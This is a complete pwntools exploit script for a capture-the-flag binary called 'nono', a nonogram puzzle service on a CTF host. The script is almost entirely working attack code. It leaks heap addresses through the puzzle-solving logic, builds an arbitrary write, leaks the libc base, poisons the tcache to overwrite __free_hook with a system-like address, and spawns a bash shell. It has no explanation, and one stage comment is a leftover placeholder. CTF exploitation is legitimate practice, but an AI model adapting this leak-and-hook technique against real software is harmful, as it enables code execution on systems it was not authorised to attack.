#!/usr/bin/env python3
from pwn import *
from ctypes import *
import sys

# Path to the binary
exe = ELF("./nono")
context.binary = exe


p = None
def connect():
    global p, libc, libc_offset

    if p is not None:
        p.close()

    if args.REMOTE:
        p = remote("pwn03.chal.ctf.westerns.tokyo", 22915)
        # place remote offsets here
        libc = ELF("./libc.so.6")
        libc_offset = 0x1ebbe0
    else:
        p = exe.process()
        libc = p.libc
        libc_offset = 0x1ebbe0

    # place local offsets here

################ Wrappers ################
def play_puzzle(idx, actions):
    p.sendlineafter("Your input: ", "1")
    p.sendlineafter("Index:\n", str(idx))

    for x, y in actions:
        p.sendlineafter(": ", str(x) + " " + str(y))


next_idx = 2
def add_puzzle(title, size, data, pad=False, check=True):
    if not isinstance(title, bytes):
        title = title.encode()
    global next_idx
    assert len(data) <= (((size**2) >> 3) + 1)
    if pad:
        data = data.ljust(((size**2) >> 3), b'\0')
    p.sendafter("Your input: ", b"2\n" + title + b"\n" + str(size).encode() + b"\n" + data)
    p.recvline_contains("Success")

    next_idx += 1
    return next_idx - 1

def delete_puzzle(idx):
    global next_idx
    next_idx -= 1
    p.sendlineafter("Your input: ", "3")
    p.sendlineafter("Index:\n", str(idx))
    assert p.readline().strip() == b"Success"

def show_puzzle(idx):
    log.info("Displaying index %s" % white(hex(idx)))
    p.sendlineafter("Your input: ", "4")
    p.sendlineafter("Index:\n", idx)
    print(p.readuntil("-------------------------------------"))
    print(p.readuntil("-------------------------------------"))

@context.silent
def solve_leak(idx, known_bits):
    #known_bits = [0,0,0,0]
    add_puzzle("leak", 92, b"\x00"*0x400)

    p.sendlineafter("Your input: ", "1")
    p.sendlineafter("Index:\n", str(idx))
    p.recvline_contains("Row's Numbers")

    row_numbers = [int(x.strip(b",")) for x in p.readuntil("\nColumn's Numbers\n", drop=True).split()]
    p.recvline_contains("Current Status")

    common = row_numbers[52:68] + row_numbers[32:40]
    common = common + [a - b for a,b in zip(row_numbers[76:88], known_bits + common[:8])]
    assert len(common) == 36

    beg_low = [a - b for a, b in zip(row_numbers[4:16], common[16:28])]
    end_low = [a - b for a, b in zip(row_numbers[68:80], common[16:28])]
    cap_low = [a - b for a, b in zip(row_numbers[40:52], common[-12:])]
    zeros = [0] * 16
    assert len(beg_low) == 12
    assert len(end_low) == 12
    assert len(cap_low) == 12

    beg_bits = beg_low + common + zeros
    end_bits = end_low + common + zeros
    cap_bits = cap_low + common + zeros

    actions = [(i, 89) for i, v in enumerate([0] * 4 + beg_bits + end_bits[:24]) if v]
    actions += [(i, 90) for i, v in enumerate(common[12:] + zeros + cap_bits[:52]) if v]

    p.sendlineafter(":", "".join(str(x) + " " + str(y) + "\n" for x, y in actions))
    p.recvline_contains("Congratz!")

    return u64(decode_int64(beg_bits)), u64(decode_int64(end_bits)), u64(decode_int64(cap_bits))

def leak_everything():
    pass

def get_leak():
    p.sendlineafter("Your input: ", "4")
    p.recvuntil("(x)\n2 : ")
    data = p.recvuntil(" (o)\n3 : write (x)", drop=True)
    p.sendlineafter("Index:\n", "-4")

    return data


def write_puzzleptr_to(addr, base=None):
    add_puzzle("write", 92, flat({
        0x400: [addr, addr, addr + 8]
    }, filler=b"\0"))
    delete_puzzle(0)
    if base:
        add_puzzle("write", 92, flat({
            0x400: [base, base + 16, base + 24]
        }, filler=b"\0"))
        return

    add_puzzle("write", 92, flat({
        0x400: [orig_vec_beg, orig_vec_end, orig_vec_cap]
    }, filler=b"\0"))

################## Exploit Stage 1: <Explain what I'm doing here> ##################

def decode_int64(numbers):
    out = b""
    for i in range(0, 64, 8):
        bits = "".join(str(x) for x in numbers[i:i+8][::-1])
        out += bytes([int(bits, 2)])
    return out

connect()

pad = 0
for i in range(pad):
    add_puzzle("pad" + str(i), 8, "\x00"*8)
beg, end, cap = solve_leak(2 + pad, known_bits=[1]*4)
info("%#x %#x %#x", beg, end, cap)

orig_vec_beg = beg + 0x490
orig_vec_end = beg + 0x4a8
orig_vec_cap = beg + 0x4b0

string_addr = beg + 0x30
info("string_addr %#x", string_addr)
write_puzzleptr_to(string_addr + 4)
write_puzzleptr_to(string_addr)

for i in range(10):
    add_puzzle("tofree" + str(i), 1, b"\x01")

for _ in range(10):
    delete_puzzle(4)


# while True:
#     connect()
#     print("solve leak")
#     ptr = solve_leak(2)
#     if ptr:
#         break

#info("leak %#x", ptr)


leak_data = get_leak()
print(hexdump(leak_data))
libc_ptr = u64(leak_data[0x4f50:0x4f50+8])
libc.address = libc_ptr - libc_offset
info("libc_ptr %#x base %#x", libc_ptr, libc.address)

for i in range(10):
    add_puzzle("claimed" + str(i), 1, b"\x01")

for i in range(5):
    add_puzzle("tcache" + str(i), 1, b"\x01")

for i in range(5):
    delete_puzzle(14)

tcache_next_addr = beg + 0x12c0
pause()
write_puzzleptr_to(tcache_next_addr, base=beg + 0x1320)
#delete_puzzle(2)
delete_puzzle(2)
delete_puzzle(1)
delete_puzzle(0)
add_puzzle(flat({
    0x0: p64(libc.symbols.__free_hook),
}, length=0x31), 1, b"\x01")

for _ in range(2):
    add_puzzle("claim", 1, b"\x01")

pause()
add_puzzle(flat({
    0x0: p64(libc.address + 0x55410),
}, length=0x31), 1, b"\x01", check=False)

p.sendline("")
p.sendlineafter("Your input: ", "2")
p.sendline("bash;test#################################################1\n\n\n\n\n")


p.interactive()
